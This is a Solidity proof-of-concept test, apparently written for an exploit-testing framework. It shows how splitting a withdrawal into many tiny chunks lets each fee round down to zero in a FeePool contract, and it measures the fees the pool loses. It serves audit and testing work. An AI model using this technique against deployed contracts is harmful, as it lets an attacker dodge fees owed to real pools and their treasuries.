// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {AssayPoC} from "assay/AssayExploit.sol";
import {FeePool} from "../src/FeePool.sol";

/// @notice Rounding in the fee: the fee on a withdrawal is rounded down, so a withdrawal small
///         enough to round to zero is free. Many small withdrawals cost nothing where one large
///         one costs 0.30 percent.
/// Knobs:
///   0 `chunk`   the amount of each withdrawal, in wei;
///   1 `chunks`  the number of withdrawals.
/// The attacker deposits exactly what it withdraws, in `chunks` withdrawals of `chunk` wei. The
/// pool is owed at least the fee on the whole amount, rounded up: the attack worked if the fees
/// that the pool accrued are less than that.
contract FeePoolFeeFloorPoC is AssayPoC {
    uint256 private constant BPS = 10_000;

    FeePool internal pool;

    function setUpTarget() internal override {
        pool = new FeePool(makeAddr("treasury"));
        address alice = makeAddr("alice");
        vm.deal(alice, 5 ether);
        vm.prank(alice);
        pool.deposit{value: 5 ether}();

        declareAttackerBalance(1 ether, 1 ether, 10 ether);
        declareKnob(0, "chunk", 333, 1, 5_000);
        declareKnob(1, "chunks", 30, 1, 40);
    }

    function exploit() internal override {
        uint256 chunk = knob(0);
        uint256 chunks = knob(1);
        uint256 total = chunk * chunks;
        uint256 feesBefore = pool.feesAccrued();

        vm.startPrank(attacker);
        pool.deposit{value: total}();
        for (uint256 i = 0; i < chunks; i++) {
            pool.withdraw(chunk);
        }
        vm.stopPrank();

        uint256 owed = (total * pool.FEE_BPS() + BPS - 1) / BPS;
        victim_loss("fees", owed, pool.feesAccrued() - feesBefore);
    }
}
